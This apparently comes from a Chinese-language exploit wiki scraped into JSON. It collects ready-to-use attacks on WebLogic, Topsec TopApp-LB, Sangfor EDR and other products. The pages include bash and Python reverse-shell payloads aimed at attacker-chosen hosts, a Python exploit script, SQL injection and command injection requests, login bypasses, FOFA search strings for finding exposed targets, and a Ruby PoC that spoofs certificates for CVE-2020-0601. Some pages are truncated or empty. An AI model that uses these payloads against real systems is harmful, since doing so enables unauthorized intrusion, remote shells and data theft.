[23:03:36][INFO] [*][CVE-2018-3252][192.168.56.129:7001] Please verify manually! [23:03:36][INFO] [*][CVE-2019-2618][192.168.56.129:7001] Start... [23:03:36][INFO] [+][CVE-2019-2618][192.168.56.129:7001] Found module! [23:03:36][INFO] [*][CVE-2019-2618][192.168.56.129:7001] Please verify manually! [23:03:36][INFO] [*][CVE-2019-2725][192.168.56.129:7001] Start... [23:03:46][INFO] [-][CVE-2019-2725][192.168.56.129:7001] Not vulnerability. [23:03:46][INFO] [*][CVE-2019-2729][192.168.56.129:7001] Start... [23:03:54][INFO] [-][CVE-2019-2729][192.168.56.129:7001] Not vulnerability. [23:03:54][INFO] [*][CVE-2019-2888][192.168.56.129:7001] Start... [23:03:56][INFO] [+][CVE-2019-2888][192.168.56.129:7001] Found module! [23:03:56][INFO] [*][CVE-2019-2888][192.168.56.129:7001] Please verify manually! [23:03:56][INFO] [*][CVE-2019-2890][192.168.56.129:7001] Start... [23:03:58][INFO] [-][CVE-2019-2890][192.168.56.129:7001] Not vulnerability. [23:03:58][INFO] [*][CVE-2020-2551][192.168.56.129:7001] Start... [23:03:58][INFO] [+][CVE-2020-2551][192.168.56.129:7001] Found module! [23:03:58][INFO] [*][CVE-2020-2551][192.168.56.129:7001] Please verify manually! [23:03:58][INFO] [*][CVE-2020-2555][192.168.56.129:7001] Start... [23:04:02][INFO] [+][CVE-2020-2555][192.168.56.129:7001] Exists vulnerability! [23:04:02][INFO] [*][CVE-2020-2883][192.168.56.129:7001] Start... [23:04:06][INFO] [+][CVE-2020-2883][192.168.56.129:7001] Exists vulnerability! [23:04:06][INFO] [*][CVE-2020-14882][192.168.56.129:7001] Start... [23:04:23][INFO] [-][CVE-2020-14882][192.168.56.129:7001] Not vulnerability. [23:04:23][INFO] [*][CVE-2020-14883][192.168.56.129:7001] Start... [23:04:23][INFO] [+][CVE-2020-14883][192.168.56.129:7001] Exists vulnerability! PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Weblogic/Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Weblogic/Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271.html","title":"Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271","keywords":"","body":"Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271 漏洞描述 Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。 影响版本 [!NOTE] Weblogic 10.3.6.0.0 Weblogic 12.1.3.0.0 Weblogic 12.2.1.0.0 Weblogic 12.2.1.2.0 环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2017-10271 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:7001 正常即可 漏洞复现 对 http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType 进行访问，存在这个url则可能存在漏洞 使用POST方法上传以下数据反弹一个shell /bin/bash -c bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1 使用Curl反弹shell (将上面的xml数据保存为poc.xml) curl -v -X POST -H \"Content-Type: text/xml\" --data @poc.xml \"http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType\" 也可以通过漏洞写入webshell文件 servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp ]]> 访问 http://xxx.xxx.xxx.xxx:7001/bea_wls_internal/test.jsp 即可得到写入的文件 漏洞利用POC 利用 weblogic-scan快速检测 [!NOTE] 反弹shell exp #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Weblogic 10.3.6.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.1.3.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.2.1.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.2.1.2.0 \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2017-10271.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:7001 \\033[0m') print('+ \\033[36mCmd >>> shell(反弹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url, IP, PORT): vuln_url = target_url + \"/wls-wsat/CoordinatorPortType\" headers = { \"Content-Type\": \"text/xml\", \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"\"\" /bin/bash -c bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1 \"\"\" % (IP,PORT) try: response = requests.request(\"POST\", url=vuln_url, headers=headers, data=data) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_1(target_url, IP, PORT) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/中间件框架漏洞/":{"url":"PeiQi_Wiki/中间件框架漏洞/","title":"中间件框架漏洞","keywords":"","body":"中间件框架漏洞🐇 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/安全产品漏洞/":{"url":"PeiQi_Wiki/安全产品漏洞/","title":"安全产品漏洞","keywords":"","body":"安全产品漏洞🐪 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/安全产品漏洞/天融信/":{"url":"PeiQi_Wiki/安全产品漏洞/天融信/","title":"天融信","keywords":"","body":"天融信 天融信负载均衡TopApp-LB 任意登陆 天融信负载均衡TopApp-LB 命令执行漏洞 天融信负载均衡TopApp-LB Sql注入漏洞 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/安全产品漏洞/天融信/天融信负载均衡TopApp-LB Sql注入漏洞.html":{"url":"PeiQi_Wiki/安全产品漏洞/天融信/天融信负载均衡TopApp-LB Sql注入漏洞.html","title":"天融信负载均衡TopApp-LB Sql注入漏洞","keywords":"","body":"天融信负载均衡TopApp-LB Sql注入漏洞 漏洞描述 天融信负载均衡 TopAPP-LB产品旧版本在管理面存在SQL注入漏洞，具体为在可以访问管理服务情况 下，攻击者通过构造恶意请求，利用系统检查输入条件不严格的缺陷，进一步可获取部分系统本地信息 影响版本 天融信负载均衡TopApp-LB FOFA [!NOTE] app=\"天融信-TopApp-LB-负载均衡系统\" 漏洞复现 利用 天融信负载均衡TopApp-LB 任意登陆 使用后台 提交以下数据包 POST /acc/clsf/report/datasource.php HTTP/1.1 Host: Connection: close Accept: text/javascript, text/html, application/xml, text/xml, */* X-Prototype-Version: 1.6.0.3 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57 Content-Type: application/x-www-form-urlencoded Content-Length: 201 t=l&e=0&s=t&l=1&vid=2147483647 or 1=1&gid=0&lmt=10&o=r_Speed&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=@。。 存在SQL盲注 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/安全产品漏洞/天融信/天融信负载均衡TopApp-LB任意登陆.html":{"url":"PeiQi_Wiki/安全产品漏洞/天融信/天融信负载均衡TopApp-LB任意登陆.html","title":"天融信负载均衡TopApp-LB任意登陆","keywords":"","body":"天融信负载均衡TopApp-LB任意登陆 漏洞描述 天融信负载均衡TopApp-LB系统无需密码可直接登陆，查看敏感信息 影响版本 天融信负载均衡TopApp-LB FOFA [!NOTE] app=\"天融信-TopApp-LB-负载均衡系统\" 漏洞复现 在登录页面中输入，账号:任意账号 密码:;id 成功登录 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/安全产品漏洞/天融信/天融信负载均衡TopApp-LB命令执行漏洞.html":{"url":"PeiQi_Wiki/安全产品漏洞/天融信/天融信负载均衡TopApp-LB命令执行漏洞.html","title":"天融信负载均衡TopApp-LB命令执行漏洞","keywords":"","body":"天融信负载均衡TopApp-LB命令执行漏洞 漏洞描述 天融信负载均衡TopApp-LB系统存在任意命令执行 影响版本 天融信负载均衡TopApp-LB FOFA [!NOTE] app=\"天融信-TopApp-LB-负载均衡系统\" 漏洞复现 登录界面中存在命令执行 账号:1;ping 6km5dk.ceye.io;echo 密码:任意 成功收到请求 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/安全产品漏洞/深信服/":{"url":"PeiQi_Wiki/安全产品漏洞/深信服/","title":"深信服","keywords":"","body":"深信服 深信服EDR远程命令执行 CNVD-2020-46552 深信服后台任意用户登陆漏洞 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/安全产品漏洞/深信服/深信服EDR远程命令执行 CNVD-2020-46552.html":{"url":"PeiQi_Wiki/安全产品漏洞/深信服/深信服EDR远程命令执行 CNVD-2020-46552.html","title":"深信服EDR远程命令执行 CNVD-2020-46552","keywords":"","body":"深信服EDR远程命令执行 CNVD-2020-46552 漏洞描述 深信服终端检测响应平台是深信服公司开发的一套EDR系统。攻击者利用该漏洞，可向目标服务器发送恶意构造的HTTP请求，从而获得目标服务器的权限，实现远程代码控制执行。 影响版本 [!NOTE] EDR v3.2.16 EDR v3.2.17 EDR v3.2.19 漏洞复现 https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&limit=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&host=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&path=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&row=whoami 反弹shell POST /tool/log/c.php HTTP/1.1 Host: x.x.x.x Upgrade-Insecure-Requests: 1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Content-Type: application/x-www-form-urlencoded;charset=utf-8 Accept-Language: zh-CN,zh;q=0.9 Content-Length: 256 strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xxx.xxx.xxx.xxx\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 向 /tool/log/c.php POST以下数据即可 strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xxx.xxx.xxx.xxx\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/安全产品漏洞/深信服/深信服后台任意用户登陆漏洞.html":{"url":"PeiQi_Wiki/安全产品漏洞/深信服/深信服后台任意用户登陆漏洞.html","title":"深信服后台任意用户登陆漏洞","keywords":"","body":"深信服后台任意用户登陆漏洞 漏洞描述 深信服终端检测响应平台是深信服公司开发的一套EDR系统。攻击者利用该漏洞，登录任意用户 影响版本 [!NOTE] EDR 漏洞复现 https://xxx.xxx.xxx.xxx/ui/login.php?user=admin [!NOTE] 注意最后的admin需要为存在的用户名 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/安全产品漏洞/锐捷/":{"url":"PeiQi_Wiki/安全产品漏洞/锐捷/","title":"锐捷","keywords":"","body":"PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/安全产品漏洞/锐捷/锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露.html":{"url":"PeiQi_Wiki/安全产品漏洞/锐捷/锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露.html","title":"锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露","keywords":"","body":"锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露 漏洞描述 锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露,可以间接获取用户账号密码信息登录后台 影响版本 [!NOTE] 锐捷RG-UAC统一上网行为管理审计系统 FOFA [!NOTE] title=\"RG-UAC登录页面\" 漏洞复现 来到登录页面 按F12查看源码,可以发现账号和密码的md5形式 解密md5得到密码后即可登录系统 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/开发框架漏洞/":{"url":"PeiQi_Wiki/开发框架漏洞/","title":"开发框架漏洞","keywords":"","body":"开发框架漏洞🐇 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/开发框架漏洞/Laravel/":{"url":"PeiQi_Wiki/开发框架漏洞/Laravel/","title":"Laravel","keywords":"","body":"Laravel Laravel PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/开发框架漏洞/Laravel/Laravel = 8.4.2 Debug模式 _ignition 远程代码执行漏洞.html":{"url":"PeiQi_Wiki/开发框架漏洞/Laravel/Laravel = 8.4.2 Debug模式 _ignition 远程代码执行漏洞.html","title":"Laravel = 8.4.2 Debug模式 _ignition 远程代码执行漏洞","keywords":"","body":"Laravel PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/开发框架漏洞/Laravel/Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129.html":{"url":"PeiQi_Wiki/开发框架漏洞/Laravel/Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129.html","title":"Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129","keywords":"","body":"Laravel 漏洞描述 Laravel 是一个免费的开源 PHP Web 框架，旨在实现的Web软件的MVC架构。2021年1月13日，阿里云应急响应中心监控到国外某安全研究团队披露了 Laravel 漏洞影响 [!NOTE] Laravel 框架 facade ignition 组件 环境搭建 git clone https://github.com/laravel/laravel.git cd laravel git checkout e849812 composer install composer require facade/ignition==2.5.1 cp .env.example .env php artisan serve 将 laravel/config/app.php 中的 debug 设置为 true 访问 http://local:8000 点击生成密钥出现如下图即成功创建密钥 刷新后正常访问 漏洞复现 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/开发语言漏洞/":{"url":"PeiQi_Wiki/开发语言漏洞/","title":"开发语言漏洞","keywords":"","body":"开发语言漏洞🐭 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/操作系统漏洞/":{"url":"PeiQi_Wiki/操作系统漏洞/","title":"操作系统漏洞","keywords":"","body":"操作系统漏洞🐺 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/操作系统漏洞/Windows/":{"url":"PeiQi_Wiki/操作系统漏洞/Windows/","title":"Windows","keywords":"","body":"Windows Windows SMB远程代码执行漏洞 CVE-2020-0796 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/操作系统漏洞/Windows/Scan/":{"url":"PeiQi_Wiki/操作系统漏洞/Windows/Scan/","title":"Scan","keywords":"","body":"扫描工具 CVE-2020-0796 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/操作系统漏洞/Windows/Scan/扫描工具 CVE-2020-0796.html":{"url":"PeiQi_Wiki/操作系统漏洞/Windows/Scan/扫描工具 CVE-2020-0796.html","title":"扫描工具 CVE-2020-0796","keywords":"","body":"扫描工具 CVE-2020-0796 Scan目录以放针对 CVE-2020-0796 4种不同利用方式的POC 奇安信 CVE-2020-0796 扫描下载 Github CVE-2020-0796 蓝屏EXP 下载 Github CVE-2020-0796 本地提权EXP 下载 Github CVE-2020-0796 RCE EXP PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/操作系统漏洞/Windows/Windows CryptoAPI欺骗漏洞 CVE-2020-0601.html":{"url":"PeiQi_Wiki/操作系统漏洞/Windows/Windows CryptoAPI欺骗漏洞 CVE-2020-0601.html","title":"Windows CryptoAPI欺骗漏洞 CVE-2020-0601","keywords":"","body":"Windows CryptoAPI欺骗漏洞 CVE-2020-0601 漏洞描述 1月15日，微软发布了针对CVE-2020-0601的安全补丁，该漏洞是微软在实现椭圆曲线加密算法数字证书验证时产生，可被利用于伪造来自可信任来源的签名或证书，并且因其业务特性会衍生出多种攻击向量，具有极高的可利用价值和极大的潜在破坏力，Win 10和windows server 2016 & 2019也都在其影响范围内。该漏洞由美国NSA国家安全局发现后汇报给微软公司，也被认为是第一个NSA公开披露的软件系统漏洞，当然也有可能存在其特殊的战术目的。绿盟科技M01N攻击安全研究团队对此漏洞原理进行了详细分析并复现了多种可能的攻击方法，提出了详细的检测及整改方案。 影响版本 [!NOTE] 带有指定参数的ECC密钥的证书的Microsoft Windows版本 依赖于Windows CryptoAPI的应用程序 漏洞复现 漏洞原理 CVE-2020-0601的根源是微软的加密库crypt32.dll中椭圆曲线加密算法的实现问题，首先我们来了解一下椭圆加密算法的基本原理。 要形象地理解椭圆曲线加密算法，可以结合图形来看，以下是一个符合椭圆曲线的方程y2 = x3 + ax + b，图像如下： 椭圆曲线具有的一些独特的性质使它适合用于加密算法： 椭圆曲线关于x轴对称 任何一条非垂直的线与曲线最多有三个点相交 曲线是光滑的，即曲线的所有点都没有两个或者两个以上的不同的切线 在椭圆曲线上任意两点A、B（若A、B重合则作A的切线），作直线交于椭圆曲线另一点C，过C做y轴的平行线与椭圆曲线交于C点，定义A+B=C。椭圆曲线的加法符合交换律和结合律。 如果A、B是同一个点，则过A作椭圆曲线的切线，以同样的方法得到对应的结果 C=2A 。 接下来是椭圆曲线加密相关的重点，如果对多个A进行累加,则可依次累加连线得到nA的值 。 起点为A，终点D=3A，阶为3 。 起点为A，终点G=4A，阶为4。 椭圆曲线加密 考虑K=kG，其中K、G为椭圆曲线Ep(a,b)上的点，n为G的阶。k为小于n的整数。则给定k和G，根据加法法则，计算K很容易（只要逐次求解）但反过来，给定K和G，求k就非常困难。因为实际使用中的ECC原则上把私钥k取得相当大，n也相当大，且椭圆曲线不再连续而是在实数内离散的值，要把n个解点逐一算出几乎是不可能的。这就是椭圆曲线加密算法的数学依据 。 点G称为基点 k(k K为公开密钥 椭圆曲线加密算法（ECC）和RSA一样是一种公开密钥加密技术，对原始数据以公钥加密，以私钥解密，即便攻击者获取密文和公钥也无法（在合理的时间或代价下）解密获取明文。 同样的，椭圆曲线加密算法（ECC）也被用于数字签名，以私钥加密生成签名，以公钥解密验证签名，如果和原文一样则签名验证成功。 公开密钥加密之所以可靠是因为它们利用了公钥密码领域的单向函数原理，正向操作非常简单，而逆向操作非常困难。 由G（基点）出发，进行k（私钥）次变换，只要按部就班地计算，就能很容易地得到终点K（公钥）的值。 已知起点G（基点）和终点K（公钥），要逆推得到移动次数k（私钥）则是一个很难的问题（最佳算法也达到了全指数复杂度） 相比传统RSA加密算法，椭圆加密算法具有着天生的优势，椭圆加密算法的逆向过程相比RSA有着更大的时间复杂度。在密钥长度相同的情况下，椭圆加密算法相比RSA具有更好的安全强度。一般认为，160比特的椭圆曲线密钥即可提供与1024比特的RSA密钥相当的安全强度。 较短的密钥也意味着更少的存储空间、更快的加解密速度和更少的带宽消耗，正因为椭圆加密算法的这些优势，它被用于Windows的签名系统、https的证书、比特币系统和中国的二代身份证系统中。 虽然椭圆曲线加密算法具有着许多优势，纯算法角度破解难度极大，微软对此算法的实现的缺漏却给漏洞利用提供了可乘之机。回到椭圆曲线加密最基本的等式 K=kG，首先需要明确的是，虽然对于给定的基点G和公钥K，要求解私钥k很困难，但是如果可以任意指定基点G，要构造一对k和G使等式成立却极其简单；最简单的情况，令基点G=K，则私钥k=1，这样一对基点和私钥可以使等式成立，也是有效的解。 在正常的标准椭圆曲线算法中，基点G并不是随意指定的，而是有固定的值（标准的作用，便是对基点G等参数的选择做出规定），例如在secp256r1版本的椭圆曲线算法中，基点G应当为标准规定的固定值，如果对参数不加验证，使得用户可以自定义传入的基点G的值（作为函数的参数），上面的私钥k=1的特殊解即可成立。 在有漏洞版本的crypt32.dll中验证使用ECC算法签名部分的函数恰恰是这个情况，原先的函数未加参数验证，参与计算的基点G的内容由被验证的证书随意指定，使未授权的证书能够构建私钥k=1的特殊解来成功通过椭圆加密算法的签名验证的过程。 让我们以CVE-2020-0601的一个POC为例来解析虚假密钥的构建过程： require 'openssl' raw = File.read ARGV[0] # 读取使用ECC算法的证书文件 ca = OpenSSL::X509::Certificate.new(raw) # 读取使用ECC算法的证书 ca_key = ca.public_key # 从证书中提取公钥ca_key ca_key.private_key = 1 # 设置私钥为1，使得公钥K==1*基点G的等式成立 group = ca_key.group group.set_generator(ca_key.public_key, group.order, group.cofactor) group.asn1_flag = OpenSSL::PKey::EC::EXPLICIT_CURVE ca_key.group = group # 利用构建的假基点G和假密钥k设置新group File.open(\"spoofed_ca.key\", 'w') { |f| f.write ca_key.to_pem } # 将新的group写入文件 修补后的Crypt32.dll中椭圆曲线加密算法的函数已加入了参数验证的部分，解决了由自由指定参数G导致的构造第二个特殊的有效密钥的问题。 一处验证机制的失误导致信任链的连锁反应。 现代的安全系统中存在着“信任链”的概念，信任链的上下级存在一种类似单向担保的关系，子级证书的可靠性由签名其的父级证书担保。签名时由根证书开始一级级向下签名，验证时则逐层溯源验证，直到找到信任的根证书文件，构成了一条信任链。位于整个“信任链”最上方的是最为重要不需要自证身份的根证书。根证书一般随系统附带或由管理员安装在系统内。 这个漏洞的存在则使得构造的无效签名通过了验证机制，使本应断裂的信任链被利用，逐级担保继续下去，最终使非法内容获得了证书所有者的合法签名身份。 漏洞利用 https://github.com/ollypwn/CurveBall 参考文章 cve-2020-0601-windows-cryptoapi欺骗漏洞分析 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/操作系统漏洞/Windows/Windows SMB远程代码执行漏洞 CVE-2020-0796.html":{"url":"PeiQi_Wiki/操作系统漏洞/Windows/Windows SMB远程代码执行漏洞 CVE-2020-0796.html","title":"Windows SMB远程代码执行漏洞 CVE-2020-0796","keywords":"","body":"Windows SMB远程代码执行漏洞 CVE-2020-0796 漏洞描述 2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Compression）,公告表示在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码 漏洞影响 [!NOTE] SMB版本 v3.1.1 Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1903 for ARM64-based Systems Windows Server, Version 1903 (Server Core installation) Windows 10 Version 1909 for 32-bit Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for ARM64-based Systems Windows Server, Version 1909 (Server Core installation) 环境搭建 在MSDN上下载对应的存在漏洞的系统版本 安装后执行命令 winver 查看系统版本，并查看是否含有 KB4551762补丁 漏洞复现 漏洞原理 CVE-2020-0796漏洞存在于受影响版本的Windows驱动srv2.sys中。Windows SMB v3.1.1 版本增加了对压缩数据的支持。图2所示为带压缩数据的SMB数据报文的构成。 ProtocolId：4字节，固定为0x424D53FC OriginalComressedSegmentSize：4字节，原始的未压缩数据大小 CompressionAlgorithm：2字节，压缩算法 Flags：2字节，详见协议文档 Offset/Length：根据Flags的取值为Offset或者Length，Offset表示数据包中压缩数据相对于当前结构的偏移 srv2.sys中处理SMBv3压缩数据包的解压函数Srv2DecompressData未严格校验数据包中OriginalCompressedSegmentSize和Offset/Length字段的合法性。而这两个字段影响了Srv2DecompressData中内存分配函数SrvNetAllocateBuffer的参数。如图4所示的Srv2DecompressData函数反编译代码，SrvNetAllocateBuffer实际的参数为OriginalCompressedSegmentSize+Offset。这两个参数都直接来源于数据包中SMB Compression Transform Header中的字段，而函数并未判断这两个字段是否合法，就直接将其相加后作为内存分配的参数(unsigned int类型）。 这里，OriginalCompressedSegmentSize+Offset可能小于实际需要分配的内存大小，从而在后续调用解压函数SmbCompressionDecompress过程中存在越界读取或者写入的风险。 目前已公开的针对该漏洞的本地提权利用包含如下的主要过程： （1）验证程序首先创建到SMS server的会话连接（记为session）。 （2）验证程序获取自身token数据结构中privilege成员在内核中的地址（记tokenAddr）。 （3）验证程序通过session发送畸形压缩数据（记为evilData）给SMB server触发漏洞。其中，evilData包含tokenAddr、权限数据、溢出占位数据。 （4） SMS server收到evilData后触发漏洞，并修改tokenAddr地址处的权限数据，从而提升验证程序的权限。 （5）验证程序获取权限后对winlogon进行控制，来创建system用户shell。 首先，看一下已公开利用的evilData数据包 数据包的内容很简单，其中几个关键字段数据如下： OriginalSize ：0xffffffff Offset：0x10 Real compressed data ：13字节的压缩数据，解压后应为1108字节’A’加8字节的token地址。 SMB3 raw data ：实际上是由2个8字节的0x1FF2FFFFBC（总长0x10)加上0x13字节的压缩数据组成 从上面的漏洞原理分析可知，漏洞成因是Srv2DecompressData函数对报文字段缺乏合法性判断造成内存分配不当。在该漏洞数据包中，OriginalSize 是一个畸形值。OriginalSize+ Offset = 0xffffffff + 0x10 = 0xf 是一个很小的值，其将会传递给SrvNetAllocateBuffer进行调用，下面具体分析内存分配情况。SrvNetAllocateBuffer的反编译代码 由于传给SrvNetAllocateBuffer的参数为0xf，根据SrvNetAllocateBuffer的处理流程可知，该请求内存将从SrvNetBufferLookasides表中分配。这里需要注意的是，变量SrvDisableNetBufferLookAsideList跟注册表项相关，系统默认状态下SrvDisableNetBufferLookAsideList为0。 SrvNetBufferLookasides表通过函数SrvNetCreateBuffer初始化，实际SrvNetCreateBuffer循环调用了SrvNetBufferLookasideAllocate分配内存，调用SrvNetBufferLookasideAllocate的参数分别为[‘0x1100’, ‘0x2100’, ‘0x4100’, ‘0x8100’, ‘0x10100’, ‘0x20100’, ‘0x40100’, ‘0x80100’, ‘0x100100’]。在这里，内存分配参数为0xf，对应的lookaside表为0x1100大小的表项。 SrvNetBufferLookasideAllocate函数实际是调用SrvNetAllocateBufferFromPool来分配内存 在函数SrvNetAllocateBufferFromPool中，对于用户请求的内存分配大小，内部通过ExAllocatePoolWithTag函数分配的内存实际要大于请求值（多出部分用于存储部分内存相关数据结构）。以请求分配0x1100大小为例，经过一系列判断后，最后分配的内存大小allocate_size= 0x1100 + E8 + 2*(MmSizeOfMdl + 8)。 内存分配完毕之后，SrvNetAllocateBufferFromPool函数还对分配的内存进行了一系列初始化操作，最后返回了一个内存信息结构体指针作为函数的返回值。 这里需要注意如下的数据关系：SrvNetAllocateBufferFromPool函数返回值return_buffer指向一个内存数据结构，该内存数据结构起始地址同实际分配内存（函数ExAllocatePoolWithTag分配的内存）起始地址的的偏移为0x1150；return_buffer+0x18位置指向了实际分配内存起始地址偏移0x50位置处，而最终return_buffer会作为函数SrvNetAllocateBuffer的返回值 回到漏洞解压函数Srv2DecompressData，在进行内存分配之后，Srv2DecompressData调用函数SmbCompressionDecompress开始解压被压缩的数据 实际上，该函数调用了Windows库函数RtlDecompressBufferEx2来实现解压，根据RtlDecompressBufferEx2的函数原型来对应分析SmbCompressionDecompress函数的各个参数。 SmbCompressionDecompress(CompressAlgo，//压缩算法 Compressed_buf，//指向数据包中的压缩数据 Compressed_size，//数据包中压缩数据大小，计算得到 UnCompressedBuf,//解压后的数据存储地址，*(alloc_buffer+0x18)+0x10 UnCompressedSize,//压缩数据原始大小,源于数据包OriginalCompressedSegmentSize FinalUnCompressedSize)//最终解压后数据大小 从反编译代码可以看出，函数SmbCompressionDecompress中保存解压后数据的地址为*(alloc_buffer+0x18)+0x10的位置，根据内存分配过程分析，alloc_buffer + 0x18指向了实际内存分配起始位置偏移0x50处，所以拷贝目的地址为实际内存分配起始地址偏移0x60位置处。 在解压过程中，压缩数据解压后将存储到这个地址指向的内存中。根据evilData数据的构造过程，解压后的数据为占坑数据和tokenAddr。拷贝到该处地址后，tokenAddr将覆盖原内存数据结构中alloc_buffer+0x18处的数据。也就是解压缩函数SmbCompressionDecompress返回后，alloc_buffer+0x18将指向验证程序的tokenAddr内核地址 继续看Srv2DecompressData的后续处理流程，解压成功后，函数判断offset的结果不为0。不为0则进行内存移动，内存拷贝的参数如下： 